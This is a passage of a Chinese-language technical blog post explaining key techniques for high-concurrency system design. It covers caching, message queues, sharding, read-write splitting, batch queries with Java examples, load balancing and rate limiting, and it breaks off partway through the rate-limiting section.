ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>最近有位粉丝问了我一个问题：如何设计一个高并发系统？</p>
<p>这是一个非常高频的面试题，面试官可以从多个角度，考查技术的广度和深度。</p>
<p>今天这篇文章跟大家一起聊聊高并发系统设计一些关键点，希望对你会有所帮助。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20a181f94d93419e8a1aa6a302aa2df2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=9700iDX3nCDi8r18OcXmH%2FhgIVs%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">1 页面静态化</h2>
<p>对于高并发系统的页面功能，我们必须要做<code>静态化</code>设计。</p>
<p>如果并发访问系统的用户非常多，每次用户访问页面的时候，都通过服务器动态渲染，会导致服务端承受过大的压力，而导致页面无法正常加载的情况发生。</p>
<p>我们可以使用<code>Freemarker</code>或<code>Velocity</code>模板引擎，实现页面静态化功能。</p>
<p>以商城官网首页为例，我们可以在<code>Job</code>中，每隔一段时间，查询出所有需要在首页展示的数据，汇总到一起，使用模板引擎生成到html文件当中。</p>
<p>然后将该<code>html</code>文件，通过<code>shell</code>脚本，自动同步到前端页面相关的服务器上。</p>
<h2 data-id="heading-2">2 CSDN加速</h2>
<p>虽说页面静态化可以提升网站网页的访问速度，但还不够，因为用户分布在全国各地，有些人在北京，有些人在成都，有些人在深圳，地域相差很远，他们访问网站的网速各不相同。</p>
<p>如何才能让用户最快访问到活动页面呢？</p>
<p>这就需要使用CDN，它的全称是Content Delivery Network，即内容分发网络。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e24948221f344ddb0ee11bf4bc24f97~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=lkUWnHnvcPvRnNeuwmttGgwh2WI%3D" alt="" loading="lazy"/>
使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。</p>
<p>CDN加速的基本原理是：将网站的静态内容（如图片、CSS、JavaScript文件等）复制并存储到分布在全球各地的服务器节点上。</p>
<p>当用户请求访问网站时，CDN系统会根据用户的地理位置，自动将内容分发给离用户最近的服务器，从而实现快速访问。</p>
<p>国内常见的CDN提供商有阿里云CDN、腾讯云CDN、百度云加速等，它们提供了全球分布的节点服务器，为全球范围内的网站加速服务。</p>
<h2 data-id="heading-3">3 缓存</h2>
<p>在高并发的系统中，<code>缓存</code>可以说是必不可少的技术之一。</p>
<p>目前缓存有两种：</p>
<ol>
<li>基于应用服务器的内存缓存，也就是我们说的二级缓存。</li>
<li>使用缓存中间件，比如：Redis、Memcached等，这种是分布式缓存。</li>
</ol>
<p>这两种缓存各有优缺点。</p>
<p>二级缓存的性能更好，但因为是基于应用服务器内存的缓存，如果系统部署到了多个服务器节点，可能会存在数据不一致的情况。</p>
<p>而Redis或Memcached虽说性能上比不上二级缓存，但它们是分布式缓存，避免多个服务器节点数据不一致的问题。</p>
<p>缓存的用法一般是这样的：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/081cb7c9af54498b93983450df9c774c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=MsgwajBcLzR2HZ8Y6C%2BHdyuhuvE%3D" alt="" loading="lazy"/>
使用缓存之后，可以减轻访问数据库的压力，显著的提升系统的性能。</p>
<p>有些业务场景，甚至会分布式缓存和二级缓存一起使用。</p>
<p>比如获取商品分类数据，流程如下：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3430577b05147db86099773dd93463c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=RSFWKvmcvbWH8k7EnvJz9rqXioY%3D" alt="" loading="lazy"/></p>
<p>不过引入缓存，虽说给我们的系统性能带来了提升，但同时也给我们带来了一些新的问题，比如：《<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwNjMwMTgzMQ%3D%3D%26mid%3D2247493521%26idx%3D1%26sn%3Dbff84e7a819d79e4b8eb7e722e96ddfc%26chksm%3Dc0e83f79f79fb66f2e7bf03a104580b404ea0a3c977846e428f13c1f12fbad46d4d778b2da14%26token%3D902535653%26lang%3Dzh_CN%23rd" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwNjMwMTgzMQ==&amp;mid=2247493521&amp;idx=1&amp;sn=bff84e7a819d79e4b8eb7e722e96ddfc&amp;chksm=c0e83f79f79fb66f2e7bf03a104580b404ea0a3c977846e428f13c1f12fbad46d4d778b2da14&amp;token=902535653&amp;lang=zh_CN#rd" ref="nofollow noopener noreferrer">数据库和缓存双向数据库一致性问题</a>》、《<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwNjMwMTgzMQ%3D%3D%26mid%3D2247491225%26idx%3D1%26sn%3Dbfb14f28911efaa6e3a615870fff9a5c%26chksm%3Dc0ebc671f79c4f6718a63bbec91d79a4b05e1dd2a7c00ed9bf6a9f582abd4c6e5c870148ff89%26token%3D902535653%26lang%3Dzh_CN%23rd" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwNjMwMTgzMQ==&amp;mid=2247491225&amp;idx=1&amp;sn=bfb14f28911efaa6e3a615870fff9a5c&amp;chksm=c0ebc671f79c4f6718a63bbec91d79a4b05e1dd2a7c00ed9bf6a9f582abd4c6e5c870148ff89&amp;token=902535653&amp;lang=zh_CN#rd" ref="nofollow noopener noreferrer">缓存穿透、击穿和雪崩问题</a>》等。</p>
<p>我们在使用缓存时，一定要结合实际业务场景，切记不要为了缓存而缓存。</p>
<h2 data-id="heading-4">4 异步</h2>
<p>有时候，我们在高并发系统当中，某些接口的业务逻辑，没必要都同步执行。</p>
<p>比如有个用户请求接口中，需要做业务操作，发站内通知，和记录操作日志。为了实现起来比较方便，通常我们会将这些逻辑放在接口中同步执行，势必会对接口性能造成一定的影响。</p>
<p>接口内部流程图如下：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/239e42718536497c86a0c2262325cc22~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=ZaMeWPKsYCxr0P7pXSoZxY1ZeI8%3D" alt="" loading="lazy"/>
这个接口表面上看起来没有问题，但如果你仔细梳理一下业务逻辑，会发现只有业务操作才是核心逻辑，其他的功能都是非核心逻辑。</p>
<p>在这里有个原则就是：核心逻辑可以同步执行，同步写库。非核心逻辑，可以异步执行，异步写库。</p>
<p>上面这个例子中，发站内通知和用户操作日志功能，对实时性要求不高，即使晚点写库，用户无非是晚点收到站内通知，或者运营晚点看到用户操作日志，对业务影响不大，所以完全可以异步处理。</p>
<p>通常异步主要有两种：多线程 和 mq。</p>
<h3 data-id="heading-5">4.1 线程池</h3>
<p>使用线程池改造之后，接口逻辑如下：<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74719e35c5b34a7ba566aea438dfa9fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=7Lwc6BIeomi3SR%2BY3TuLYD8ulmk%3D" alt="" loading="lazy"/>发站内通知和用户操作日志功能，被提交到了两个单独的线程池中。</p>
<p>这样接口中重点关注的是业务操作，把其他的逻辑交给线程异步执行，这样改造之后，让接口性能瞬间提升了。</p>
<p>但使用线程池有个小问题就是：如果服务器重启了，或者是需要被执行的功能出现异常了，无法重试，会丢数据。</p>
<p>那么这个问题该怎么办呢？</p>
<h3 data-id="heading-6">4.2 mq</h3>
<p>使用mq改造之后，接口逻辑如下：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd663e1e95fd4bcab15e153684b30892~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=BrPJfQVyRwI1CYXZPRYnxCZxaWw%3D" alt="" loading="lazy"/>
对于发站内通知和用户操作日志功能，在接口中并没真正实现，它只发送了mq消息到mq服务器。然后由mq消费者消费消息时，才真正的执行这两个功能。</p>
<p>这样改造之后，接口性能同样提升了，因为发送mq消息速度是很快的，我们只需关注业务操作的代码即可。</p>
<h2 data-id="heading-7">5 多线程处理</h2>
<p>在高并发系统当中，用户的请求量很大。</p>
<p>假如我们现在用mq处理业务逻辑。</p>
<p>一下子有大量的用户请求，产生了大量的mq消息，保存到了mq服务器。</p>
<p>而mq的消费者，消费速度很慢。</p>
<p>可能会导致大量的消息积压问题。</p>
<p>从而严重影响数据的实时性。</p>
<p>我们需要对消息的消费者做优化。</p>
<p>最快的方式是使用<code>多线程</code>消费消息，比如：改成线程池消费消息。</p>
<p>当然核心线程数、最大线程数、队列大小 和 线程回收时间，一定要做成配置的，后面可以根据实际情况动态调整。</p>
<p>这样改造之后，我们可以快速解决消息积压问题。</p>
<p>除此之外，在很多数据导入场景，用多线程导入数据，可以提升效率。</p>
<blockquote>
<p>温馨提醒一下：使用多线程消费消息，可能会出现消息的顺序问题。如果你的业务场景中，需要保证消息的顺序，则要用其他的方式解决问题。感兴趣的小伙伴，可以找我私聊。</p>
</blockquote>
<h2 data-id="heading-8">6 分库分表</h2>
<p>有时候，高并发系统的吞吐量受限的不是别的，而是数据库。</p>
<p>当系统发展到一定的阶段，用户并发量大，会有大量的数据库请求，需要占用大量的数据库连接，同时会带来磁盘IO的性能瓶颈问题。</p>
<p>此外，随着用户数量越来越多，产生的数据也越来越多，一张表有可能存不下。由于数据量太大，sql语句查询数据时，即使走了索引也会非常耗时。</p>
<p>这时该怎么办呢？</p>
<p>答：需要做<code>分库分表</code>。</p>
<p>如下图所示：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a530fde9284a47e2bff9db2fa98e0a73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=69KBLhtiOSFWD8DwP7P4pQDPZF0%3D" alt="" loading="lazy"/>
图中将用户库拆分成了三个库，每个库都包含了四张用户表。</p>
<p>如果有用户请求过来的时候，先根据用户id路由到其中一个用户库，然后再定位到某张表。</p>
<p>路由的算法挺多的：</p>
<ul>
<li>根据id取模，比如：id=7，有4张表，则7%4=3，模为3，路由到用户表3。</li>
<li>给id指定一个区间范围，比如：id的值是0-10万，则数据存在用户表0，id的值是10-20万，则数据存在用户表1。</li>
<li>一致性hash算法</li>
</ul>
<p>分库分表主要有两个方向：<code>垂直</code>和<code>水平</code>。</p>
<p>说实话垂直方向（即业务方向）更简单。</p>
<p>在水平方向（即数据方向）上，分库和分表的作用，其实是有区别的，不能混为一谈。</p>
<ul>
<li>分库：是为了解决数据库连接资源不足问题，和磁盘IO的性能瓶颈问题。</li>
<li>分表：是为了解决单表数据量太大，sql语句查询数据时，即使走了索引也非常耗时问题。此外还可以解决消耗cpu资源问题。</li>
<li>分库分表：可以解决 数据库连接资源不足、磁盘IO的性能瓶颈、检索数据耗时 和 消耗cpu资源等问题。</li>
</ul>
<p>如果在有些业务场景中，用户并发量很大，但是需要保存的数据量很少，这时可以只分库，不分表。</p>
<p>如果在有些业务场景中，用户并发量不大，但是需要保存的数量很多，这时可以只分表，不分库。</p>
<p>如果在有些业务场景中，用户并发量大，并且需要保存的数量也很多时，可以分库分表。</p>
<p>关于分库分表更详细的内容，可以看看我另一篇文章，里面讲的更深入《<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwNjMwMTgzMQ%3D%3D%26mid%3D2247490459%26idx%3D1%26sn%3D1e4296228c00aa4203aab481575ac916%26chksm%3Dc0ebc373f79c4a658de7ce7f0d8cf30b1f45adb346c2386321779e7cf85a757a12337d3ae233%26token%3D2041133408%26lang%3Dzh_CN%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwNjMwMTgzMQ==&amp;mid=2247490459&amp;idx=1&amp;sn=1e4296228c00aa4203aab481575ac916&amp;chksm=c0ebc373f79c4a658de7ce7f0d8cf30b1f45adb346c2386321779e7cf85a757a12337d3ae233&amp;token=2041133408&amp;lang=zh_CN&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">阿里二面：为什么分库分表？</a>》</p>
<h2 data-id="heading-9">7 池化技术</h2>
<p>其实不光是高并发系统，为了性能考虑，有些低并发的系统，也在使用<code>池化技术</code>，比如：数据库连接池、线程池等。</p>
<p>池化技术是<code>多例设计模式</code>的一个体现。</p>
<p>我们都知道<code>创建</code>和<code>销毁</code>数据库连接是非常耗时耗资源的操作。</p>
<p>如果每次用户请求，都需要创建一个新的数据库连接，势必会影响程序的性能。</p>
<p>为了提升性能，我们可以创建一批数据库连接，保存到内存中的某个集合中，缓存起来。</p>
<p>这样的话，如果下次有需要用数据库连接的时候，就能直接从集合中获取，不用再额外创建数据库连接，这样处理将会给我们提升系统性能。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c14efe3606f43dbbc6c0882ceb2d064~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=QTipTkSx%2BiSsQXtqz10i8hGgJRw%3D" alt="" loading="lazy"/>
当然用完之后，需要及时归还。</p>
<p>目前常用的数据库连接池有：Druid、C3P0、hikari和DBCP等。</p>
<h2 data-id="heading-10">8 读写分离</h2>
<p>不知道你有没有听说过<code>二八原则</code>，在一个系统当中可能有80%是读数据请求，另外20%是写数据请求。</p>
<p>不过这个比例也不是绝对的。</p>
<p>我想告诉大家的是，一般的系统读数据请求会远远大于写数据请求。</p>
<p>如果读数据请求和写数据请求，都访问同一个数据库，可能会相互抢占数据库连接，相互影响。</p>
<p>我们都知道，一个数据库的数据库连接数量是有限，是非常宝贵的资源，不能因为读数据请求，影响到写数据请求吧？</p>
<p>这就需要对数据库做<code>读写分离</code>了。</p>
<p>于是，就出现了主从读写分离架构：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e88e20b1c0b847c9b9fe868bf7bcfe19~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=UCqKVg5X41xUeRX%2BdlH5ZKb0xx4%3D" alt="" loading="lazy"/>
考虑刚开始用户量还没那么大，选择的是一主一从的架构，也就是常说的一个<code>master</code>，一个<code>slave</code>。</p>
<p>所有的写数据请求，都指向主库。一旦主库写完数据之后，立马异步同步给从库。这样所有的读数据请求，就能及时从从库中获取到数据了（除非网络有延迟）。</p>
<p>但这里有个问题就是：如果用户量确实有些大，如果master挂了，升级slave为master，将所有读写请求都指向新master。</p>
<p>但此时，如果这个新master根本扛不住所有的读写请求，该怎么办？</p>
<p>这就需要一主多从的架构了：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11940b56d35b4c0bb9af605cb27abc87~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=k%2BOz3q7DoFt%2F6OJom3LOwL03wDg%3D" alt="" loading="lazy"/>
上图中我列的是一主两从，如果master挂了，可以选择从库1或从库2中的一个，升级为新master。假如我们在这里升级从库1为新master，则原来的从库2就变成了新master的的slave了。</p>
<p>调整之后的架构图如下：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb223b979b0c4691a39dae3da965af21~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=wOvSes5s3aethDnJXfJ11lJuAHc%3D" alt="" loading="lazy"/>
这样就能解决上面的问题了。</p>
<p>除此之外，如果查询请求量再增大，我们还可以将架构升级为一主三从、一主四从...一主N从等。</p>
<h2 data-id="heading-11">9 索引</h2>
<p>在高并发的系统当中，用户经常需要查询数据，对数据库增加<code>索引</code>，是必不可少的一个环节。</p>
<p>尤其是表中数据非常多时，加了索引，跟没加索引，执行同一条sql语句，查询相同的数据，耗时可能会相差N个数量级。</p>
<p>虽说索引能够提升SQL语句的查询速度，但索引也不是越多越好。</p>
<p>在insert数据时，需要给索引分配额外的资源，对insert的性能有一定的损耗。</p>
<p>我们要根据实际业务场景来决定创建哪些索引，索引少了，影响查询速度，索引多了，影响写入速度。</p>
<p>很多时候，我们需要经常对索引做优化。</p>
<ol>
<li>可以将多个单个索引，改成一个联合索引。</li>
<li>删除不要索引。</li>
<li>使用explain关键字，查询SQL语句的执行计划，看看哪些走了索引，哪些没有走索引。</li>
<li>要注意索引失效的一些场景。</li>
<li>必要时可以使用force index来强制查询sql走某个索引。</li>
</ol>
<p>如果你想进一步了解explain的详细用法，可以看看我的另一篇文章《<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwNjMwMTgzMQ%3D%3D%26mid%3D2247490262%26idx%3D1%26sn%3Da67f610afa984ecca130a54a3be453ab%26chksm%3Dc0ebc23ef79c4b2869dea998e413c5cbea6aeeea01ee74efc7c1a5fc228baa7beca215adf3ea%26token%3D751314179%26lang%3Dzh_CN%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwNjMwMTgzMQ==&amp;mid=2247490262&amp;idx=1&amp;sn=a67f610afa984ecca130a54a3be453ab&amp;chksm=c0ebc23ef79c4b2869dea998e413c5cbea6aeeea01ee74efc7c1a5fc228baa7beca215adf3ea&amp;token=751314179&amp;lang=zh_CN&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">explain | 索引优化的这把绝世好剑，你真的会用吗？</a>》。</p>
<p>如果你想进一步了解哪些情况下索引会失效，可以看看我的另一篇文章《<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwNjMwMTgzMQ%3D%3D%26mid%3D2247491626%26idx%3D1%26sn%3D18fc949c06f04fe8f4c29b6fc5c66f9c%26chksm%3Dc0e838c2f79fb1d45c6f9b2ab188bb4663414690bab0718a7d46beb875e6b83e5e67ec27d2ff%26token%3D902535653%26lang%3Dzh_CN%23rd" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwNjMwMTgzMQ==&amp;mid=2247491626&amp;idx=1&amp;sn=18fc949c06f04fe8f4c29b6fc5c66f9c&amp;chksm=c0e838c2f79fb1d45c6f9b2ab188bb4663414690bab0718a7d46beb875e6b83e5e67ec27d2ff&amp;token=902535653&amp;lang=zh_CN#rd" ref="nofollow noopener noreferrer">聊聊索引失效的10种场景，太坑了</a>》。</p>
<h2 data-id="heading-12">10 批处理</h2>
<p>有时候，我们需要从指定的用户集合中，查询出有哪些是在数据库中已经存在的。</p>
<p>实现代码可以这样写：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">queryUser</span><span class="hljs-params">(List&lt;User&gt; searchList)</span> {
    <span class="hljs-keyword">if</span> (CollectionUtils.isEmpty(searchList)) {
        <span class="hljs-keyword">return</span> Collections.emptyList();
    }

    List&lt;User&gt; result = Lists.newArrayList();
    searchList.forEach(user -&gt; result.add(userMapper.getUserById(user.getId())));
    <span class="hljs-keyword">return</span> result;
}
</code></pre>
<p>这里如果有50个用户，则需要循环50次，去查询数据库。我们都知道，每查询一次数据库，就是一次远程调用。</p>
<p>如果查询50次数据库，就有50次远程调用，这是非常耗时的操作。</p>
<p>那么，我们如何优化呢？</p>
<p>答：<code>批处理</code>。</p>
<p>具体代码如下：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">queryUser</span><span class="hljs-params">(List&lt;User&gt; searchList)</span> {
    <span class="hljs-keyword">if</span> (CollectionUtils.isEmpty(searchList)) {
        <span class="hljs-keyword">return</span> Collections.emptyList();
    }
    List&lt;Long&gt; ids = searchList.stream().map(User::getId).collect(Collectors.toList());
    <span class="hljs-keyword">return</span> userMapper.getUserByIds(ids);
}
</code></pre>
<p>提供一个根据用户id集合<code>批量查询</code>用户的接口，只远程调用一次，就能查询出所有的数据。</p>
<p>这里有个需要注意的地方是：id集合的大小要做限制，最好一次不要请求太多的数据。要根据实际情况而定，建议控制每次请求的记录条数在500以内。</p>
<h2 data-id="heading-13">11 集群</h2>
<p>系统部署的服务器节点，可能会down机，比如：服务器的磁盘坏了，或者操作系统出现内存不足问题。</p>
<p>为了保证系统的高可用，我们需要部署多个节点，构成一个<code>集群</code>，防止因为部分服务器节点挂了，导致系统的整个服务不可用的情况发生。</p>
<p>集群有很多种：</p>
<ol>
<li>应用服务器集群</li>
<li>数据库集群</li>
<li>中间件集群</li>
<li>文件服务器集群</li>
</ol>
<p>我们以中间件<code>Redis</code>为例。</p>
<p>在高并发系统中，用户的数据量非常庞大时，比如用户的缓存数据总共大小有40G，一个服务器节点只有16G的内存。</p>
<p>这样需要部署3台服务器节点。</p>
<p>该业务场景，使用普通的master/slave模式，或者使用哨兵模式都行不通。</p>
<p>40G的数据，不能只保存到一台服务器节点，需要均分到3个master服务器节点上，一个master服务器节点保存13.3G的数据。</p>
<p>当有用户请求过来的时候，先经过路由，根据用户的id或者ip，每次都访问指定的服务器节点。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/88762cfa75a1483d926bda60f3a8d948~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=jOfwxSHboLh0DP%2FC%2Bm8VFx%2FFzUs%3D" alt="" loading="lazy"/>
这用就构成了一个集群。</p>
<p>但这样有风险，为了防止其中一个master服务器节点挂掉，导致部分用户的缓存访问不了，还需要对数据做备份。</p>
<p>这样每一个master，都需要有一个slave，做数据备份。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/340ac6995b874d13af2dfa4d13ecb81f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=3jYono6YFtr6zhtYRLdT6Jex7NM%3D" alt="" loading="lazy"/>
如果master挂了，可以将slave升级为新的master，而不影响用户的正常使用。</p>
<h2 data-id="heading-14">12 负载均衡</h2>
<p>如果我们的系统部署到了多台服务器节点。那么哪些用户的请求，访问节点a，哪些用户的请求，访问节点b，哪些用户的请求，访问节点c？</p>
<p>我们需要某种机制，将用户的请求，转发到具体的服务器节点上。</p>
<p>这就需要使用<code>负载均衡</code>机制了。</p>
<p>在linux下有<code>Nginx</code>、<code>LVS</code>、<code>Haproxy</code>等服务可以提供负载均衡服务。</p>
<p>在SpringCloud微服务架构中，大部分使用的负载均衡组件就是<code>Ribbon</code>、<code>OpenFegin</code>或<code>SpringCloud Loadbalancer</code>。</p>
<p>硬件方面，可以使用<code>F5</code>实现负载均衡。它可以基于交换机实现负载均衡，性能更好，但是价格更贵一些。</p>
<p>常用的负载均衡策略有：</p>
<ol>
<li><code>轮询</code>：每个请求按时间顺序逐一分配到不同的服务器节点，如果服务器节点down掉，能自动剔除。</li>
<li><code>weight权重</code>：weight代表权重默认为1，权重越高，服务器节点被分配到的概率越大。weight和访问比率成正比，用于服务器节点性能不均的情况。</li>
<li><code>ip hash</code>：每个请求按访问ip的hash结果分配, 这样每个访客固定访问同一个服务器节点，它是解诀Session共享的问题的解决方案之一。</li>
<li><code>最少连接数</code>：把请求转发给连接数较少的服务器节点。轮询算法是把请求平均的转发给各个服务器节点，使它们的负载大致相同；但有些请求占用的时间很长，会导致其所在的服务器节点负载较高。这时least_conn方式就可以达到更好的负载均衡效果。</li>
<li><code>最短响应时间</code>：按服务器节点的响应时间来分配请求，响应时间短的服务器节点优先被分配。</li>
</ol>
<p>当然还有其他的策略，在这里就不给大家一一介绍了。</p>
<h2 data-id="heading-15">13 限流</h2>
<p>对于高并发系统，为了保证系统的稳定性，需要对用户的请求量做<code>限流</code>。</p>
<p>特别是秒杀系统中，如果不做任何限制，绝大部分商品可能是被机器抢到，而非正常的用户，有点不太公平。</p>
<p>所以，我们有必要识别这些非法请求，做一些限制。那么，我们该如何现在这些非法请求呢？</p>
<p>目前有两种常用的限流方式：</p>
<ul>
<li>基于nginx限流</li>
<li>基于redis限流</li>
</ul>
<h3 data-id="heading-16">13.1 对同一用户限流</h3>
<p>为了防止某个用户，请求接口次数过于频繁，可以只针对该用户做限制。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8025c82acaa447218ba4e5082ff7ac85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=Oe4hNkjeMa%2FXUCn0PH0c1bC%2B6mg%3D" alt="" loading="lazy"/>
限制同一个用户id，比如每分钟只能请求5次接口。</p>
<h3 data-id="heading-17">13.2 对同一ip限流</h3>
<p>有时候只对某个用户限流是不够的，有些高手可以模拟多个用户请求，这种nginx就没法识别了。</p>
<p>这时需要加同一ip限流功能。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35fb1769086a4bf4a47d1ecaa24092e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=CglW76T2%2FPGlSCI5OAqYO0NI9oc%3D" alt="" loading="lazy"/>
限制同一个ip，比如每分钟只能请求5次接口。</p>
<p>但这种限流方式可能会有误杀的情况，比如同一个公司或网吧的出口ip是相同的，如果里面有多个正常用户同时发起请求，有些用户可能会被限制住。</p>
<h3 data-id="heading-18">13.3 对接口限流</h3>
<p>别以为限制了用户和ip就万事大吉，有些高手甚至可以使用代理，每次都请求都换一个ip。</p>
<p>这时可以限制请求的接口总次数。
